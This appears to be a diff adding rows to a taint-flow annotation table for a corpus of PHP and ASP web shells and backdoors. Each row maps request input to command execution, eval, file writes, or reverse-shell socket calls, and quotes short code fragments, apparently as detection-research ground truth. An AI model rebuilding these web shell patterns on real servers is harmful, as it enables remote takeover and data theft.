+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	1515	http-fetch	1517	file-write	must	$data = curl_exec 1515 -> file_put_contents($name,$data) 1517
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	1616	input-request	1643	file-write	must	$d_conten=$_GET[mass_cont] 1616 -> fwrite($handle,$d_conten) 1643
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	1640	file-open	1643	file-write	must	$handle = fopen($xd_path,"wb") 1640 -> fwrite 1643
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	1887	input-request	1907	file-open	must	$ppp=$_POST[path] 1887 -> fopen($ppp.$sep.$c_file,$mmode) 1907
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	1886	input-request	1910	file-write	must	$c_cont=$_POST[code_cont] 1886 -> fwrite($fd,$c_cont) 1910
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	1907	file-open	1910	file-write	must	$fd = fopen 1907 -> fwrite 1910
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	1934	input-request	1934	file-open	must	$_GET[down] 1934 -> file_get_contents 1934
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	2028	input-request	2050	file-open	must	$upl=$_GET[upload_file] 2028 -> fopen($upl,"r") 2050
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	2029	input-request	2062	file-open	must	$down=$_GET[download_file] 2029 -> fopen($down,"w") 2062
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	1986	input-request	1987	file-write	must	$ssh_cmd=$_GET[ssh_cmd] 1986 -> fwrite($shell,$ssh_cmd) 1987
+/mnt/games/normtest/s3/php/061_php-backdoor.php	6	input-request	7	file-open	must	$filename=$_REQUEST['f'] (6) then fopen("$filename") (7)
+/mnt/games/normtest/s3/php/061_php-backdoor.php	7	file-open	8	file-open	must	$file=fopen (7) then fpassthru($file) (8)
+/mnt/games/normtest/s3/php/061_php-backdoor.php	29	input-request	29	proc-start	must	system($_REQUEST['c']) nested (29)
+/mnt/games/normtest/s3/php/061_php-backdoor.php	35	input-request	37	file-write	must	$dir=$_REQUEST['dir'] (35) used in move_uploaded_file($..., $dir.$fname) (37)
+/mnt/games/normtest/s3/php/081_php-backdoor.php	6	input-request	7	file-open	must	$filename=$_REQUEST['f'] (6) then fopen("$filename") (7); copy of 061
+/mnt/games/normtest/s3/php/081_php-backdoor.php	7	file-open	8	file-open	must	$file=fopen (7) then fpassthru($file) (8); copy of 061
+/mnt/games/normtest/s3/php/081_php-backdoor.php	29	input-request	29	proc-start	must	system($_REQUEST['c']) nested (29); copy of 061
+/mnt/games/normtest/s3/php/081_php-backdoor.php	35	input-request	37	file-write	must	$dir=$_REQUEST['dir'] (35) used in move_uploaded_file (37); copy of 061
+/mnt/games/normtest/s3/php/062_php-reverse-shell.php	100	net-connect	162	file-write	may	$sock=fsockopen (100) then fwrite($sock,...) (162); printit() defined by file called in between
+/mnt/games/normtest/s3/php/062_php-reverse-shell.php	100	net-connect	171	file-write	may	$sock=fsockopen (100) then fwrite($sock,...) (171); printit() called in between
+/mnt/games/normtest/s3/php/082_php-reverse-shell.php	100	net-connect	162	file-write	may	$sock=fsockopen (100) then fwrite($sock,...) (162); printit() called in between; copy of 062
+/mnt/games/normtest/s3/php/082_php-reverse-shell.php	100	net-connect	171	file-write	may	$sock=fsockopen (100) then fwrite($sock,...) (171); copy of 062
+/mnt/games/normtest/s3/php/097_php-reverse-shell.php	100	net-connect	162	file-write	may	$sock=fsockopen (100) then fwrite($sock,...) (162); printit() called in between
+/mnt/games/normtest/s3/php/097_php-reverse-shell.php	100	net-connect	171	file-write	may	$sock=fsockopen (100) then fwrite($sock,...) (171); printit() called in between
+/mnt/games/normtest/s3/php/108_php-reverse-shell.php	49	input-request	102	net-connect	may	$ip=isset($_POST['ip'])?... (49) used in fsockopen($ip,$port) (102); printit() called in between
+/mnt/games/normtest/s3/php/108_php-reverse-shell.php	52	input-request	102	net-connect	may	$port from $_POST['port'] (52) used in fsockopen (102); printit() called in between
+/mnt/games/normtest/s3/php/108_php-reverse-shell.php	102	net-connect	164	file-write	may	$sock=fsockopen (102) then fwrite($sock,...) (164); printit() called in between
+/mnt/games/normtest/s3/php/108_php-reverse-shell.php	102	net-connect	173	file-write	may	$sock=fsockopen (102) then fwrite($sock,...) (173); printit() called in between
+/mnt/games/normtest/s3/php/063_phpinfo.php	0	-	0	-	none	only phpinfo(), not a table row; no request
+/mnt/games/normtest/s3/php/064_qsd-php-backdoor.php	70	input-request	70	file-perm-set	must	chmod($_REQUEST['chm'],0777) nested (70)
+/mnt/games/normtest/s3/php/064_qsd-php-backdoor.php	79	input-request	79	file-open	must	fopen($_REQUEST['dl'].$_REQUEST['file']) (79)
+/mnt/games/normtest/s3/php/064_qsd-php-backdoor.php	87	input-request	87	file-open	must	readfile($_REQUEST['dl']) (87)
+/mnt/games/normtest/s3/php/064_qsd-php-backdoor.php	102	input-request	112	proc-start	must	$directory=$_REQUEST["gz"] (102) used in exec("cd $directory; tar czf ...") (112)
+/mnt/games/normtest/s3/php/064_qsd-php-backdoor.php	102	input-request	113	file-open	must	$directory used in file_get_contents($directory."/".$archive) (113)
+/mnt/games/normtest/s3/php/064_qsd-php-backdoor.php	102	input-request	124	file-delete	must	$directory used in unlink($directory."/".$archive) (124)
+/mnt/games/normtest/s3/php/064_qsd-php-backdoor.php	129	input-request	130	file-open	must	$filename=$_REQUEST['f'] (129) then fopen("$filename") (130)
+/mnt/games/normtest/s3/php/064_qsd-php-backdoor.php	130	file-open	132	file-open	must	$file=fopen (130) then fpassthru($file) (132)
+/mnt/games/normtest/s3/php/064_qsd-php-backdoor.php	217	input-request	217	proc-start	must	exec($_REQUEST['c'],$return) nested (217)
+/mnt/games/normtest/s3/php/064_qsd-php-backdoor.php	241	input-request	247	file-write	must	$target_path=$_COOKIE["uploadDir"] (241) used in move_uploaded_file(...,$target_path) (247)
+/mnt/games/normtest/s3/php/064_qsd-php-backdoor.php	247	input-request	247	file-write	must	move_uploaded_file($_FILES['file_name']['tmp_name'],...) (247)
+/mnt/games/normtest/s3/php/064_qsd-php-backdoor.php	327	input-request	327	file-delete	must	unlink($_REQUEST['df']) nested (327)
+/mnt/games/normtest/s3/php/064_qsd-php-backdoor.php	383	input-request	387	file-open	must	$_REQUEST['ef'].=$_REQUEST['file'] (383) used in fopen($_REQUEST['ef'],"w") (387)
+/mnt/games/normtest/s3/php/064_qsd-php-backdoor.php	386	input-request	386	data-decode	must	base64_decode($_POST["newcontent"]) nested in urldecode (386)
+/mnt/games/normtest/s3/php/064_qsd-php-backdoor.php	386	data-decode	391	file-write	must	$_POST["newcontent"]=urldecode(base64_decode(..)) (386) then fwrite($stream,$_POST["newcontent"]) (391)
+/mnt/games/normtest/s3/php/064_qsd-php-backdoor.php	387	file-open	391	file-write	must	$stream=fopen($_REQUEST['ef'],"w") (387) then fwrite($stream,...) (391)
+/mnt/games/normtest/s3/php/064_qsd-php-backdoor.php	402	input-request	402	file-open	must	file_get_contents($_REQUEST['ef']) (402)
+/mnt/games/normtest/s3/php/083_qsd-php-backdoor.php	70	input-request	70	file-perm-set	must	chmod($_REQUEST['chm'],0777) (70); copy of 064
+/mnt/games/normtest/s3/php/083_qsd-php-backdoor.php	79	input-request	79	file-open	must	fopen($_REQUEST['dl'].$_REQUEST['file']) (79); copy of 064
+/mnt/games/normtest/s3/php/083_qsd-php-backdoor.php	87	input-request	87	file-open	must	readfile($_REQUEST['dl']) (87); copy of 064
+/mnt/games/normtest/s3/php/083_qsd-php-backdoor.php	102	input-request	112	proc-start	must	$directory=$_REQUEST["gz"] (102) used in exec (112); copy of 064
+/mnt/games/normtest/s3/php/083_qsd-php-backdoor.php	129	input-request	130	file-open	must	$filename=$_REQUEST['f'] (129) then fopen (130); copy of 064
+/mnt/games/normtest/s3/php/083_qsd-php-backdoor.php	130	file-open	132	file-open	must	$file=fopen (130) then fpassthru($file) (132); copy of 064
+/mnt/games/normtest/s3/php/083_qsd-php-backdoor.php	217	input-request	217	proc-start	must	exec($_REQUEST['c'],$return) (217); copy of 064
+/mnt/games/normtest/s3/php/083_qsd-php-backdoor.php	241	input-request	247	file-write	must	$target_path=$_COOKIE["uploadDir"] (241) used in move_uploaded_file (247); copy of 064
+/mnt/games/normtest/s3/php/083_qsd-php-backdoor.php	327	input-request	327	file-delete	must	unlink($_REQUEST['df']) (327); copy of 064
+/mnt/games/normtest/s3/php/083_qsd-php-backdoor.php	386	data-decode	391	file-write	must	base64_decode (386) then fwrite($stream,$_POST["newcontent"]) (391); copy of 064
+/mnt/games/normtest/s3/php/083_qsd-php-backdoor.php	387	file-open	391	file-write	must	$stream=fopen (387) then fwrite($stream) (391); copy of 064
+/mnt/games/normtest/s3/php/067_simple-backdoor.php	7	input-request	8	proc-start	must	$cmd=($_REQUEST['cmd']) (7) then system($cmd) (8)
+/mnt/games/normtest/s3/php/084_simple-backdoor.php	7	input-request	8	proc-start	must	$cmd=($_REQUEST['cmd']) (7) then system($cmd) (8); copy of 067
+/mnt/games/normtest/s3/php/072_php-findsock-shell.php	0	-	0	-	none	system() at 87 takes only $_SERVER values, not a request row; no request reaches a node
+/mnt/games/normtest/s3/php/102_php-findsock-shell.php	0	-	0	-	none	system() at 87 takes only $_SERVER values, not a request row; copy of 072
+/mnt/games/normtest/s3/php/065_root.php	4	file-open	4	data-decode	must	file_get_contents(__FILE__) via explode into str_rot13 (4); self-reading obfuscated loader
+/mnt/games/normtest/s3/php/065_root.php	4	data-decode	4	data-decode	must	str_rot13 -> strrev -> base64_decode nested (4)
+/mnt/games/normtest/s3/php/065_root.php	4	data-decode	4	data-eval	may	$bn[2]=base64_decode(strrev(str_rot13(...))) (4) reaches eval($bn[2]) through an array element
+/mnt/games/normtest/s3/php/066_shell.php	92	input-request	26	proc-start	may	$cmd=$_POST['cmd'] (92) passed to featureShell($cmd) (96), exec($cmd) (26)
+/mnt/games/normtest/s3/php/066_shell.php	102	input-request	47	proc-start	may	$_POST['filename'] (102) passed to featureHint, $cmd built (41-45), shell_exec($cmd) (47)
+/mnt/games/normtest/s3/php/066_shell.php	105	input-request	70	file-open	may	$_POST['path'] (105) passed to featureUpload($path), fopen($path,'wb') (70)
+/mnt/games/normtest/s3/php/066_shell.php	105	input-request	77	data-decode	may	$_POST['file'] (105) passed to featureUpload($file), base64_decode($file) (77)
+/mnt/games/normtest/s3/php/066_shell.php	70	file-open	77	file-write	must	$f=fopen($path,'wb') (70) then fwrite($f,...) (77)
+/mnt/games/normtest/s3/php/066_shell.php	77	data-decode	77	file-write	must	fwrite($f, base64_decode($file)) nested (77)
+/mnt/games/normtest/s3/php/066_shell.php	92	input-request	54	file-open	may	$cmd (92) -> featureShell regex match -> featureDownload($match[1]) -> file_get_contents (54)
+/mnt/games/normtest/s3/php/060_my_seller.php	1	data-decode	1	data-eval	must	eval("?>".base64_decode("...")) (1); payload is a literal; decoded body not mapped to file lines
+/mnt/games/normtest/s3/php/069_teknelogi.php	79	input-request	79	file-write	must	copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name']) (79)
+/mnt/games/normtest/s3/php/069_teknelogi.php	57	input-request	79	file-write	may	$path=$_GET['path'] (57) or getcwd() (59), used in copy destination (79)
+/mnt/games/normtest/s3/php/069_teknelogi.php	95	input-request	95	file-open	must	file_get_contents($_GET['filesrc']) nested (95)
+/mnt/games/normtest/s3/php/069_teknelogi.php	100	input-request	100	file-perm-set	must	chmod($_POST['path'],$_POST['perm']) (100)
+/mnt/games/normtest/s3/php/069_teknelogi.php	113	input-request	113	file-rename	must	rename($_POST['path'],$path.'/'.$_POST['newname']) (113)
+/mnt/games/normtest/s3/php/069_teknelogi.php	57	input-request	113	file-rename	may	$path from $_GET['path'] (57) or getcwd() (59), used in rename (113)
+/mnt/games/normtest/s3/php/069_teknelogi.php	127	input-request	127	file-open	must	fopen($_POST['path'],'w') (127)
+/mnt/games/normtest/s3/php/069_teknelogi.php	127	file-open	128	file-write	must	$fp=fopen (127) then fwrite($fp,$_POST['src']) (128)
+/mnt/games/normtest/s3/php/069_teknelogi.php	128	input-request	128	file-write	must	fwrite($fp,$_POST['src']) (128)
+/mnt/games/normtest/s3/php/069_teknelogi.php	134	input-request	134	file-open	must	file_get_contents($_POST['path']) (134)
+/mnt/games/normtest/s3/php/069_teknelogi.php	144	input-request	144	file-delete	must	rmdir($_POST['path']) (144)
+/mnt/games/normtest/s3/php/069_teknelogi.php	150	input-request	150	file-delete	must	unlink($_POST['path']) (150)
+/mnt/games/normtest/s3/php/070_vhost.php	43	file-open	50	file-write	must	$filhat=fopen(".htaccess" via $elakab,'w') (43) then fwrite($filhat,$htcont) (50)
+/mnt/games/normtest/s3/php/070_vhost.php	53	file-open	54	file-write	must	$file=fopen("xaivhost.cin","w+") (53) then fwrite($file,base64_decode($xaivhost)) (54)
+/mnt/games/normtest/s3/php/070_vhost.php	54	data-decode	54	file-write	must	fwrite($file,base64_decode($xaivhost)) nested (54), literal payload
+/mnt/games/normtest/s3/php/070_vhost.php	54	file-write	56	file-perm-set	shared	"xaivhost.cin" written (53-54) then chmod("xaivhost.cin",0755) (56)
+/mnt/games/normtest/s3/php/071_wso.php	356	input-request	356	data-eval	must	eval($_POST['p1']) (356); large file, only salient rows
+/mnt/games/normtest/s3/php/071_wso.php	734	input-request	734	data-eval	must	eval($_POST['p1']) (734)
+/mnt/games/normtest/s3/php/071_wso.php	759	input-request	759	data-eval	must	eval($_POST['p1']) (759)
+/mnt/games/normtest/s3/php/071_wso.php	671	input-request	272	proc-start	may	ex($_POST['p1']) (671) -> function ex($in) exec($in) (272)
+/mnt/games/normtest/s3/php/071_wso.php	724	input-request	272	proc-start	may	ex($_POST['p1']) (724) -> function ex($in) exec($in) (272)
+/mnt/games/normtest/s3/php/071_wso.php	1603	input-request	272	proc-start	may	ex("/tmp/bp ".$_POST['p2']." ".$_POST['p3']." &") (1603) -> ex() exec (272)
+/mnt/games/normtest/s3/php/071_wso.php	872	input-request	272	proc-start	may	ex('tar cfzv '.escapeshellarg($_POST['p2']).' '.implode(' ',$_COOKIE['f'])) (872) -> ex() exec (272)
+/mnt/games/normtest/s3/php/071_wso.php	445	input-request	445	file-open	must	fopen($_POST['p1'],"r") (445)
+/mnt/games/normtest/s3/php/071_wso.php	455	input-request	455	file-open	must	fopen($_POST['p1'],'w') (455)
+/mnt/games/normtest/s3/php/071_wso.php	488	input-request	488	file-open	must	fopen($_POST['p1'],'r') (488)
+/mnt/games/normtest/s3/php/071_wso.php	508	input-request	508	file-perm-set	must	chmod($_POST['p1'],$perms) (508)
+/mnt/games/normtest/s3/php/071_wso.php	522	input-request	522	file-open	must	fopen($_POST['p1'],"w") (522)
+/mnt/games/normtest/s3/php/071_wso.php	522	file-open	524	file-write	must	$fp=fopen (522) then fwrite($fp,$_POST['p3']) (524)
+/mnt/games/normtest/s3/php/071_wso.php	524	input-request	524	file-write	must	fwrite($fp,$_POST['p3']) (524)
+/mnt/games/normtest/s3/php/071_wso.php	531	input-request	531	file-open	must	fopen($_POST['p1'],'r') (531)
+/mnt/games/normtest/s3/php/071_wso.php	540	input-request	540	file-open	must	file_get_contents($_POST['p1']) (540)
+/mnt/games/normtest/s3/php/071_wso.php	565	input-request	565	file-rename	must	rename($_POST['p1'],$_POST['p3']) (565)
+/mnt/games/normtest/s3/php/071_wso.php	576	input-request	576	file-perm-set	must	touch($_POST['p1'],$time,$time) (576)
+/mnt/games/normtest/s3/php/071_wso.php	767	input-request	767	data-load	must	unserialize($_COOKIE['f']) (767)
+/mnt/games/normtest/s3/php/071_wso.php	773	input-request	773	file-write	must	move_uploaded_file($tmpName,$_FILES['f']['name'][$i]) (773)
+/mnt/games/normtest/s3/php/071_wso.php	837	input-request	837	file-rename	must	rename($_COOKIE['c'].$f,...) (837)
+/mnt/games/normtest/s3/php/071_wso.php	1049	input-request	1049	file-write	must	copy("compress.zlib://".$_POST['p2'],$temp) (1049)
+/mnt/games/normtest/s3/php/071_wso.php	1062	input-request	1062	http-open	must	curl_init("file://".$_POST['p2']."\x00".SELF_PATH) (1062)
+/mnt/games/normtest/s3/php/071_wso.php	1062	http-open	1063	http-fetch	must	$ch=curl_init (1062) then curl_exec($ch) (1063)
+/mnt/games/normtest/s3/php/071_wso.php	1068	input-request	1068	lib-load	must	include($_POST['p2']) (1068)
+/mnt/games/normtest/s3/php/071_wso.php	1422	input-request	1422	file-open	must	fopen($_POST['file'],'w') (1422)
+/mnt/games/normtest/s3/php/071_wso.php	1594	file-open	1595	file-write	must	cf(): $w=fopen($f,"w") (1594) then fwrite($w,...) (1595)
+/mnt/games/normtest/s3/php/071_wso.php	1595	data-decode	1595	file-write	must	fwrite/fputs/file_put_contents(.., base64_decode($t)) nested (1595)
+/mnt/games/normtest/s3/php/071_wso.php	1633	input-request	1633	data-call	must	call_user_func('action'.$_POST['a']) (1633)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	499	input-request	499	file-rename	must	rename($_GET['old_name'],$r_new_name) (499), $r_new_name from $_GET['new_name'] (497)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	514	input-request	515	file-open	must	$edt_file=$_GET['edit'] (514) then file_get_contents($edt_file) (515); large file, salient rows only
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	514	input-request	522	file-open	must	$edt_file=$_GET['edit'] (514) then fopen($edt_file) (522)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	544	input-request	544	file-open	must	fopen($_POST['e_file'],"w+") (544)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	544	file-open	551	file-write	must	$handle=fopen (544) then fwrite($handle,$_POST['e_content_n']) (551)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	551	input-request	551	file-write	must	fwrite($handle,$_POST['e_content_n']) (551)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	563	input-request	564	file-delete	must	$del_file=$_GET['del_fil'] (563) then unlink($del_file) (564)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	2269	input-request	591	file-delete	may	$d_dir=$_GET['del_dir'] (2269) -> deldirs($d_dir) (file function) -> rmdir($d_dir) (591)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	605	input-request	606	file-open	must	$r_file=$_GET['read'] (605) then file_get_contents($r_file) (606)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	605	input-request	613	file-open	must	$r_file=$_GET['read'] (605) then fopen($r_file) (613)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	638	input-request	638	file-write	must	copy($_GET['c_file'],$_GET['c_target'].$sep.$_GET['cn_name']) (638)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	652	input-request	652	file-perm-set	must	chmod($_GET['p_filex'],$_GET['new_perm']) (652)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	681	input-request	683	file-open	must	$c_file=$_GET['new_f_name'] (681) then fopen($c_file,"w") (683)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	682	input-request	690	file-write	must	$c_file_contents=$_GET['n_file_content'] (682) then fwrite($handle,$c_file_contents) (690)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	683	file-open	690	file-write	must	$handle=fopen (683) then fwrite($handle,..) (690)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	717	input-request	721	proc-start	may	$cmd=$_GET['cmdexe'] (717) set only if given, else the parameter of cmd($cmd) (711); shell_exec($cmd) (721)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	717	input-request	725	proc-start	may	$cmd=$_GET['cmdexe'] (717) or parameter; exec($cmd,$res) (725)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	717	input-request	731	proc-start	may	$cmd=$_GET['cmdexe'] (717) or parameter; system($cmd) (731)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	717	input-request	745	proc-start	may	$cmd=$_GET['cmdexe'] (717) or parameter; proc_open($cmd) (745)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	799	input-request	799	file-write	must	move_uploaded_file($_FILES['upload_f']['tmp_name'],$_FILES['upload_f']['name']) (799)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	830	input-request	873	net-connect	may	$ip=$_GET['my_ip'] (830) used in fsockopen($ip,$port) (873); printit() defined by file called in between
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	831	input-request	873	net-connect	may	$port=$_GET['my_port'] (831) used in fsockopen (873)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	941	data-decode	941	data-decode	must	gzinflate(base64_decode($bind_perl)) nested (941)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	941	data-decode	941	file-write	must	fwrite($handlr,gzinflate(base64_decode($bind_perl))) (941)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	968	data-decode	968	data-decode	must	gzinflate(base64_decode($cookie_highjacker)) nested (968)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	968	data-decode	972	file-write	must	$cook=gzinflate(...) (968) then fwrite($han_le,$cook) (972)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	969	file-open	972	file-write	must	$han_le=fopen("jith_cookie.php","w+") (969) then fwrite($han_le,$cook) (972)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	1262	file-open	1264	file-write	must	$file5=fopen("test.txt","w") (1262) then fputs($file5,$temp) (1264)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	1497	input-request	1516	http-open	must	$rt_ffile=$_GET['rurlfile'] (1497) then curl_init($rt_ffile) (1516)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	1516	http-open	1518	http-fetch	must	$ch=curl_init (1516) then curl_exec($ch) (1518)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	1518	http-fetch	1520	file-write	must	$data=curl_exec($ch) (1518) then file_put_contents($name,$data) (1520)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	1619	input-request	1646	file-write	must	$d_conten=$_GET['mass_cont'] (1619) then fwrite($handle,$d_conten) (1646)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	1618	input-request	1643	file-open	must	$d_file=$_GET['mass_name'] (1618) -> $xd_path (1640) -> fopen($xd_path) (1643)
+/mnt/games/normtest/s3/php/058_indrajith2.2.php	1643	file-open	1646	file-write	must	$handle=fopen($xd_path,"wb") (1643) then fwrite($handle,$d_conten) (1646)
+/mnt/games/normtest/s3/php/092_dns.php	97	input-request	143	net-getaddr	must	$query=$_POST['query'] (97) then dns_get_record($query,...) (143)
+/mnt/games/normtest/s3/php/103_dns.php	79	input-request	125	net-getaddr	must	$query=$_POST['query'] (79) then dns_get_record($query,...) (125)
+/mnt/games/normtest/s3/php/093_file.php	99	input-request	109	file-open	must	$file=$_GET["file"] (99) then readfile($file) (109)
+/mnt/games/normtest/s3/php/104_file.php	84	input-request	94	file-open	must	$file=$_GET["file"] (84) then readfile($file) (94)
+/mnt/games/normtest/s3/php/094_hidden.php	35	input-request	36	data-call	may	@extract($_REQUEST) (35) defines $ctime,$atime; $ctime($atime) called (36)
+/mnt/games/normtest/s3/php/095_host.php	96	input-request	128	net-getaddr	must	$query=$_POST['query'] (96) then gethostbyaddr($query) (128)
+/mnt/games/normtest/s3/php/105_host.php	79	input-request	111	net-getaddr	must	$query=$_POST['query'] (79) then gethostbyaddr($query) (111)
+/mnt/games/normtest/s3/php/096_killnc.php	0	-	0	-	none	exec('killall nc') (111) has constant argument; no request
+/mnt/games/normtest/s3/php/107_killnc.php	0	-	0	-	none	exec('killall nc') (94) constant argument; include of literal ipcheck.php; no request
+/mnt/games/normtest/s3/php/098_proxy.php	242	input-request	295	file-open	may	$url=$_GET["laudurl"] (242) -> geturlarray($url) (file function) -> fopen(buildurl($url_c)) (295)
+/mnt/games/normtest/s3/php/098_proxy.php	244	input-request	295	file-open	may	$url=$_POST["laudurl"] (244) -> geturlarray/buildurl (file functions) -> fopen (295)
+/mnt/games/normtest/s3/php/109_proxy.php	226	input-request	279	file-open	may	$url=$_GET["laudurl"] (226) -> geturlarray/buildurl (file functions) -> fopen (279)
+/mnt/games/normtest/s3/php/109_proxy.php	228	input-request	279	file-open	may	$url=$_POST["laudurl"] (228) -> geturlarray/buildurl -> fopen (279)
+/mnt/games/normtest/s3/php/099_shell.php	127	input-request	247	proc-start	may	$command=$_POST['command'] (127) reassigned in alias expansion; logout() etc between; proc_open($command) (247)
+/mnt/games/normtest/s3/php/111_shell.php	105	input-request	226	proc-start	may	$command=$_POST['command'] (105) reassigned in alias expansion; proc_open($command) (226)
+/mnt/games/normtest/s3/php/100_laudanum.php	0	-	0	-	none	WordPress plugin wrapper; include(sprintf("%s/templates/settings.php",dirname(__FILE__))) has no request
+/mnt/games/normtest/s3/php/106_ipcheck.php	0	-	0	-	none	IP check library, no table node reached by a request
+/mnt/games/normtest/s3/php/110_settings.php	0	-	0	-	none	HTML settings page, no request reaches a node
+/mnt/games/normtest/graph_research/work2/scripts/php/070_sitet.php	0	-	0	-	none	HTML page, no PHP code
+/mnt/games/normtest/graph_research/work2/scripts/php/071_ametneque.php	0	-	0	-	none	HTML page, no PHP code
+/mnt/games/normtest/graph_research/work2/scripts/php/072_laudantiumnihil.php	0	-	0	-	none	HTML page, no PHP code
+/mnt/games/normtest/graph_research/work2/scripts/php/073_aliquidautem.php	0	-	0	-	none	HTML page, no PHP code
+/mnt/games/normtest/graph_research/work2/scripts/php/074_index.php	0	-	0	-	none	large PE binary (MZ) named .php, no PHP code
+/mnt/games/normtest/graph_research/work2/scripts/php/075_4.php	0	-	0	-	none	large PE binary (MZ) named .php, no PHP code
+/mnt/games/normtest/graph_research/work2/scripts/php/076_suicide.php	0	-	0	-	none	48-byte JS reload snippet, no PHP
+/mnt/games/normtest/graph_research/work2/scripts/php/077_refreshment.php	0	-	0	-	none	JavaScript cookie snippet, no PHP
+/mnt/games/normtest/s3/asp/010_cmd-asp-5.1.asp	13	input-request	18	proc-start	must	szCMD=Request.Form(C) l13 into oS.Run l18
+/mnt/games/normtest/s3/asp/011_cmdasp.asp	23	input-request	28	proc-start	must	szCMD=Request.Form(.CMD) l23 into oScript.Run l28
+/mnt/games/normtest/s3/asp/008_aspcmd.asp	26	input-request	112	proc-start	must	JScript ASP: q=Request(q) l26 -> command l36 -> shell.Exec l112
+/mnt/games/normtest/s3/asp/008_aspcmd.asp	27	input-request	112	proc-start	must	cd=Request(cd) l27 -> changedir l109 -> shell.Exec l112
+/mnt/games/normtest/s3/asp/012_dns.asp	128	input-request	136	proc-start	must	query=Request.Form(query) l128 -> command l134 -> objWShell.Exec l136
+/mnt/games/normtest/s3/asp/012_dns.asp	93	input-request	136	proc-start	may	qtype=Request.Form(type) l93, reassigned l103 in a branch, -> command l134 -> Exec l136
+/mnt/games/normtest/s3/asp/013_file.asp	84	input-request	98	file-open	may	filepath=Request.QueryString(file) l84 -> fso.GetFile l90 -> file.Path (object member) -> stream.LoadFromFile l98
+/mnt/games/normtest/s3/asp/014_kacak.asp	130	input-request	130	file-write	must	CreateTextFile(Request.QueryString(dosyakaydet) & request(dosadi)) l130
+/mnt/games/normtest/s3/asp/014_kacak.asp	134	input-request	134	file-open	must	OpenTextFile(Request.QueryString(dosyakaydet) & ...) l134
+/mnt/games/normtest/s3/asp/014_kacak.asp	529	input-request	529	file-open	must	OpenTextFile(request.querystring(kaydet)) l529
+/mnt/games/normtest/s3/asp/014_kacak.asp	544	input-request	544	file-open	must	opentextfile(request.querystring(duzenle)) l544
+/mnt/games/normtest/s3/asp/014_kacak.asp	661	input-request	662	file-delete	must	silincekklas=request.querystring(silklas) l661 -> deletefolder l662
+/mnt/games/normtest/s3/asp/015_newaspcmd.asp	34	input-request	8	proc-start	may	szCMD=request(cmd) l34 -> getCommandOutput(theCommand) l35 (file function) -> objshell.exec l8
+/mnt/games/normtest/s3/asp/017_proxy.asp	146	input-request	367	http-connect	may	url=Request.QueryString(laudurl) l146 in sub ParseUrl -> url* globals -> FullUrl l231 -> http.Open l367
+/mnt/games/normtest/s3/asp/017_proxy.asp	136	input-request	375	http-send	may	CleanFormValues r.Replace(request.form) l136 -> params l371 -> http.Send l375; http made by two ProgIDs l358/l360
+/mnt/games/normtest/s3/asp/018_shell.asp	55	input-request	58	proc-start	must	cmd=Request.Form(cmd) l55 -> wShell.Exec(cmd) l58
+/mnt/games/normtest/s3/asp/007_Manisso.asp	453	input-request	456	proc-start	must	szCMD=Request.QueryString(.CMD) into oScript.Run; file large
+/mnt/games/normtest/s3/asp/007_Manisso.asp	410	input-request	412	file-delete	must	caminho=Request.QueryString(path) -> ObjFSO.DeleteFolder caminho; file large
+/mnt/games/normtest/s3/asp/007_Manisso.asp	592	input-request	594	file-open	must	file=Request.QueryString(file) -> fso.OpenTextFile(file) txtview; file large
+/mnt/games/normtest/s3/asp/007_Manisso.asp	603	input-request	605	file-open	must	file=Request.QueryString(file) -> fso.OpenTextFile(file) txtedit; file large
+/mnt/games/normtest/s3/asp/007_Manisso.asp	618	input-request	618	file-open	must	OpenTextFile(Replace(Trim(Request.Form(path)))) nested; file large
+/mnt/games/normtest/s3/asp/007_Manisso.asp	629	input-request	630	file-write	may	caminho=showobjpath(Request.Form(path)) & name (file function) -> CreateTextFile(caminho); file large
+/mnt/games/normtest/s3/asp/007_Manisso.asp	655	input-request	671	file-open	must	strFileName=Request.QueryString(file) -> Stream.LoadFromFile strFileName; file large
+/mnt/games/normtest/s3/asp/007_Manisso.asp	515	input-request	515	reg-set	must	WshShell.RegWrite(Trim(Request.QueryString(key)),...) nested; file large
+/mnt/games/normtest/s3/asp/007_Manisso.asp	690	input-request	101	file-write	may	File.SaveToDisk Request.QueryString(path) -> sub SaveToDisk(sPath) -> oFS.CreateTextFile(sPath & FileName); file large
